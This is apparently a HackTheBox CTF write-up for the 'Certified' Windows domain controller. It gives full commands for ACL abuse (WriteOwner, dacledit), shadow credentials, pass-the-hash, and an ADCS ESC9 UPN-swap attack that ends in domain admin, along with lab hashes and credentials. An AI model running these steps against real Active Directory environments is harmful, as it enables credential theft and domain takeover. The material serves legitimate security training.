---
title: "Certified"
date: 2026-07-17 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, medium, active-directory, bloodhound, acl-abuse, writeowner, dacledit, shadow-credentials, winrm, adcs, esc9, pass-the-hash, certipy, evil-winrm]
description: "Starting with assume-breach credentials, judith.mader's WriteOwner right on the management AD group was abused to grant herself GenericWrite over management_svc, enabling a shadow credentials attack that yielded management_svc's NT hash and a WinRM foothold."
---

## Overview

Certified is a medium-difficulty Windows box centered on Active Directory certificate abuse and ACL misconfigurations. Starting with assume-breach credentials for judith.mader, BloodHound reveals a WriteOwner edge on the `management` group which is leveraged to grant WriteMembers, add judith to the group, and gain GenericWrite over management_svc — enabling a shadow credentials attack for the foothold. From management_svc, GenericAll over ca_operator repeats the same technique for lateral movement, and ca_operator's enroll rights on a template missing the security extension (ESC9) allow a UPN-swap certificate request that returns the Administrator NT hash for full domain compromise.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150,84.0 254.5,116.0 150.0,150.0 137.1,167.8 108.2,136.4" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

The high Real-Life axis reflects that AD ACL abuse, shadow credentials, and ADCS ESC9 are all commonly found and exploited in real enterprise environments; the low CVE and Custom Exploitation axes reflect that no named CVE drove the chain and every step used existing public tooling.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53   | DNS     | Domain controller DNS |
| 88   | Kerberos | DC01.certified.htb |
| 135  | MSRPC   | RPC endpoint mapper |
| 139  | NetBIOS | SMB |
| 389  | LDAP    | certified.htb domain |
| 445  | SMB     | Windows file sharing |
| 464  | Kerberos | kpasswd |
| 593  | RPC over HTTP | |
| 636  | LDAPS   | Secure LDAP |
| 3268 | Global Catalog LDAP | |
| 3269 | Global Catalog LDAPS | |
| 5985 | WinRM   | Windows Remote Management |
| 9389 | AD Web Services | |

```bash
nmap -p- --min-rate=1000 -T4 -Pn 10.10.11.41
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -Pn 10.10.11.41
```

The port layout is a classic Windows domain controller — DNS, Kerberos, LDAP, SMB, and WinRM all open. The presence of WinRM on 5985 and LDAP/Kerberos immediately suggests that if we can obtain credentials for any account in the right group, we can land a shell without needing to exploit a service vulnerability.

## Enumeration

With the assume-breach credentials `judith.mader:judith09`, the first step is to add the domain to `/etc/hosts` and run BloodHound to map the AD attack surface:

```bash
echo '10.10.11.41  certified.htb dc01.certified.htb' | sudo tee -a /etc/hosts
```

```bash
bloodhound-python -u judith.mader -p judith09 -d certified.htb -ns 10.10.11.41 -c All
```

BloodHound reveals a critical [privilege escalation](https://cwe.mitre.org/data/definitions/269.html) edge: judith.mader has **WriteOwner** on the `management` group. WriteOwner allows taking ownership of the group object, which in turn permits modifying its DACL to grant arbitrary additional rights.

The attack path BloodHound surfaces:

- judith.mader — WriteOwner → management (group)
- management (group) — GenericWrite → management_svc (user)
- management_svc — GenericAll → ca_operator (user)
- ca_operator — Enroll → CertifiedAuthentication (ADCS template, ESC9 vulnerable)

## Foothold

With the WriteOwner edge confirmed, the chain proceeds in three sub-steps: take ownership, grant WriteMembers, add judith to the group, then abuse GenericWrite.

Take ownership of the `management` group using owneredit.py (from [ShutdownRepo/impacket](https://github.com/ShutdownRepo/impacket)):

```bash
python3 owneredit.py -action write -new-owner judith.mader -target management certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41
```

Grant judith.mader the WriteMembers right on the group:

```bash
python3 dacledit.py -action write -rights WriteMembers -principal judith.mader -target management certified.htb/judith.mader:judith09 -dc-ip 10.10.11.41
```

Add judith to the management group (this grants her the GenericWrite over management_svc that the group holds):

```bash
net rpc group addmem management judith.mader -U 'certified.htb/judith.mader%judith09' -S 10.10.11.41
```

With GenericWrite on management_svc, perform a [shadow credentials](https://cwe.mitre.org/data/definitions/287.html) attack. This writes a Key Credential to `msDS-KeyCredentialLink`, performs PKINIT with the generated key pair, and returns management_svc's NT hash via U2U unpac-the-hash — no password needed:

```bash
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.10.11.41
```

Certipy outputs the NT hash for management_svc. Authenticate via WinRM:

```bash
evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

A shell as `management_svc` is established.

## User flag

```bash
type C:\Users\management_svc\Desktop\user.txt   # HTB{...}
```

The user flag is owned from the management_svc shell.

## Privilege Escalation

### Lateral — management_svc to ca_operator

BloodHound already showed management_svc has GenericAll over ca_operator. GenericAll subsumes GenericWrite, so the identical shadow credentials technique applies:

```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.10.11.41
```

The NT hash for ca_operator is returned.

### ADCS ESC9 — ca_operator to Administrator

Enumerate ADCS templates for vulnerabilities with the ca_operator hash:

```bash
certipy-ad find -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -vulnerable -stdout
```

Certipy flags the `CertifiedAuthentication` template as **ESC9** — it has `CT_FLAG_NO_SECURITY_EXTENSION` set, meaning issued certificates do not embed the `szOID_NTDS_CA_SECURITY_EXT` extension. Without this extension the KDC maps an incoming certificate to an account purely by looking up the UPN in the Subject Alternative Name, making it possible to impersonate any account whose UPN we can match at certificate request time.

The ESC9 exploit is:

1. Change ca_operator's UPN to `Administrator` so the CA will embed that UPN in the certificate.
2. Request a certificate under the vulnerable template.
3. Reset ca_operator's UPN back (required to avoid a UPN conflict at authentication time — the KDC lookup must resolve to the real Administrator object, not ca_operator).
4. Authenticate with the certificate; the KDC maps the embedded UPN to Administrator and issues a TGT + NT hash.

```bash
certipy-ad account update -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -user ca_operator -upn Administrator
```

```bash
certipy-ad req -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -target 10.10.11.41 -ca certified-DC01-CA -template CertifiedAuthentication -out admin_esc9
```

```bash
certipy-ad account update -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -user ca_operator -upn ca_operator@certified.htb
```

```bash
certipy-ad auth -pfx admin_esc9.pfx -domain certified.htb -dc-ip 10.10.11.41
```

Note: this box has a clock skew of approximately +7 hours relative to Kali. If Kerberos rejects the TGS due to timestamp validation, prepend `LD_PRELOAD=/path/to/libftime.so` (with `FAKETIME=+25200s`) to the `certipy-ad auth` call to offset the reported system time.

Certipy returns the Administrator NT hash. [Pass-the-hash](https://cwe.mitre.org/data/definitions/269.html) as Administrator:

```bash
evil-winrm -i 10.10.11.41 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

## Root flag

```bash
type C:\Users\Administrator\Desktop\root.txt   # HTB{...}
```

Full domain compromise achieved — Administrator shell on DC01 via the ESC9 ADCS misconfiguration chain.
